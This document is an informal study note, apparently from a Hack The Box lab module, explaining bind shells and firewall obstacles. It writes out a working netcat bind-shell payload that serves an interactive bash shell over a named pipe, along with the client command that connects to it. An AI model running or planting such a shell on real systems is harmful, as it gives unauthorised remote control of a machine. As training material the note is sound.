
#### No. 2: Client - Connecting to bind shell on target

Bind Shells

```shell-session
JackTheWizard@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```



There are more custom configured shells for security like.

just type echo $SHELL (usually ig)


You can also find this out from the ps command and the env command





## Bind Shells


in many cases, we will be working establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done using a Bind and Reverse Shell

## What Is It?

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

#### Bind Example

![image](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

As seen in the image we would connect directly with the IP address and port listening on the target. There can be many challenges with getting the shell with way though


- The listener has to be started on the Target machine 
- Admins typically configure strict incoming firewall rules and NAT at the edge of the network, so we would likely have to be on the internal network to be able to pivot like this.
- Operating system firewalls will likely block most incoming connections that are trusted



OS firewalls become a real issue when establishing a shell since we need to consider IP addresses, ports, and the tool in use to get our connection working. In the example above the application used to start the listener is Netcat.


## Establishing a Basic Bind Shell with Netcat

We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

#### No. 1: Server - Binding a Bash shell to the TCP session

Bind Shells

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

#### No. 2: Client - Connecting to bind shell on target

Bind Shells

```shell-session
JackTheWizard@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```





